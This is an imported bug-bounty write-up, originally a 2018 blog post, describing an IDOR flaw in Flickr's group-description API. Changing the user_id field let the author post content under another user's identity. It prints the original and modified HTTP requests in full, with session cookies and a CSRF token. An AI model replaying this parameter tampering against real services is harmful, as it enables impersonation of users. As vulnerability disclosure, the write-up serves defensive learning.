---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-04-16_spoof-an-user-to-create-a-description-of-a-group-in-flickr.md
original_filename: 2018-04-16_spoof-an-user-to-create-a-description-of-a-group-in-flickr.md
title: Spoof an user to create a description of a group in Flickr
category: documents
detected_topics:
- idor
- access-control
- command-injection
- csrf
- api-security
tags:
- imported
- documents
- idor
- access-control
- command-injection
- csrf
- api-security
language: en
raw_sha256: b70a649499b7d63671e6cd9b4789d2e09b18ff91223437266326b5947d880280
text_sha256: 5d6570485ecc362342035c39f1c8a0172f98140f95a46f78f39327be5502f4fa
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: true
---

# Spoof an user to create a description of a group in Flickr

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-04-16_spoof-an-user-to-create-a-description-of-a-group-in-flickr.md
- Source Type: markdown
- Detected Topics: idor, access-control, command-injection, csrf, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: True
- Raw SHA256: `b70a649499b7d63671e6cd9b4789d2e09b18ff91223437266326b5947d880280`
- Text SHA256: `5d6570485ecc362342035c39f1c8a0172f98140f95a46f78f39327be5502f4fa`


## Content

---
title: "Spoof an user to create a description of a group in Flickr"
url: "https://medium.com/@saamux/spoof-a-user-to-create-a-description-of-a-group-in-flickr-72b6b8432404"
authors: ["Samuel (@saamux)"]
programs: ["Flickr"]
bugs: ["IDOR"]
publication_date: "2018-04-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5915
scraped_via: "browseros"
---

# Spoof an user to create a description of a group in Flickr

Spoof an user to create a description of a group in Flickr
Samuel
Follow
3 min read
·
Apr 16, 2018

170

1

Press enter or click to view image in full size

Hi guys, I’m now at San Francisco and I’m very happy because I met with a lot of Hackers at HackerOne h1–415. I am very grateful to have participated. Since it’s raining I decided to write this post in the hotel.

I love the Yahoo program, it has a very large scope, it is very pleasant to be able to study the technology and the behavior of its services, sometimes it takes a lot of time to exploit something, however, all sacrifice has its reward

I have decided to look for vulnerabilities in Flickr and well, I had not worked with this website before. Flickr has multiple services, in which you can cross-test between more accounts, fraud tests, authorization problems, etc.

Among so many tests that I did, I came to the group section, where I first created a group:

Press enter or click to view image in full size
Group created by user A

After creating this group, I went to create a group description.

Press enter or click to view image in full size
Group Description

Now with the administrator user I modified the created description, doing this the following request was generated:

Get Samuel’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Original Request

POST /services/rest HTTP/1.1 Host: api.flickr.com Connection: close Content-Length: 341 Origin: https://www.flickr.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept: */* Referer: https://www.flickr.com/groups/3112603@N20/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es;q=0.9 Cookie: xb=494601; ffs=138666580-1480; cookie_accid=138666580; cookie_epass=my_cookies; localization=es-us%3Bcl%3Bcl; BX=f5kvta5ud0g9q&b=4&d=lq1Mmb1pYFSvzX1jAve8cwScqQs-&s=lv&i=rsUJjvasshshdhsJ; sa=1518891368%3A138671920%40N05%3A38475100499aa04d205cdff7870c0eb1; cookie_session=cookie flrbp=1518801856-6-b625b3cb6510531eab398458f7289ac17cab92931; flrbrp=1518801856-3664c6a6799b3d9a83842bd2f37d76ff9bd2aa6b7; flrb=15; vp=1349%2C662%2C1%2C17%2Cgroup-pool-preview-view%3A1063%2Csearch-photos-everyone-view%3A1079%2Cphotolist-container%3A1079%2Cprofile-container%3A1079%2Cshowcase-container%3A863; RT=s=1518803429246&u=&r=https%3A//www.flickr.com/groups_create.gne
  group_id=3112603%40N20&blast=This%20is%20a%20rule%20with%20user%20A&user_id=138671920%40N05&extras=gimme_blast&viewerNSID=138671920%40N05&method=flickr.groups.addBlast&csrf=1518832271%3Ahfolijlgt08%3A5325f7c116aefd8f69552aaaafbcbec2&api_key=***REDACTED***

I thought, What would happen if I modify the value of the variable user_id by the value of another user’s ID ?. Therefore I proceeded to carry out this process:

Modified Request

POST /services/rest HTTP/1.1 Host: api.flickr.com Connection: close Content-Length: 341 Origin: https://www.flickr.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept: */* Referer: https://www.flickr.com/groups/3112603@N20/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es;q=0.9 Cookie: xb=494601; ffs=138666580-1480; cookie_accid=138666580; cookie_epass=my_cookies; localization=es-us%3Bcl%3Bcl; BX=f5kvta5ud0g9q&b=4&d=lq1Mmb1pYFSvzX1jAve8cwScqQs-&s=lv&i=rsUJjvasshshdhsJ; sa=1518891368%3A138671920%40N05%3A38475100499aa04d205cdff7870c0eb1; cookie_session=cookie flrbp=1518801856-6-b625b3cb6510531eab398458f7289ac17cab92931; flrbrp=1518801856-3664c6a6799b3d9a83842bd2f37d76ff9bd2aa6b7; flrb=15; vp=1349%2C662%2C1%2C17%2Cgroup-pool-preview-view%3A1063%2Csearch-photos-everyone-view%3A1079%2Cphotolist-container%3A1079%2Cprofile-container%3A1079%2Cshowcase-container%3A863; RT=s=1518803429246&u=&r=https%3A//www.flickr.com/groups_create.gne
  group_id=3112603%40N20&blast=This%20is%20a%20rule%20with%20user%20B&user_id=147120294%40N08&extras=gimme_blast&viewerNSID=138671920%40N05&method=flickr.groups.addBlast&csrf=1518832271%3Ahfolijlgt08%3A5325f7c116aefd8f69552aaaafbcbec2&api_key=***REDACTED***

I got

Press enter or click to view image in full size
Spoof another user

As you can see, the account of the victim user has been spoofed. (The ID of another user can be obtained in multiple ways, commenting on photos of a user, giving likes to photos, etc.)

The impact of this is that a user could use the name of another user to write content in their group, in this way the confidentiality of the account of the victim user would be affected.

Thanks you

@saamux
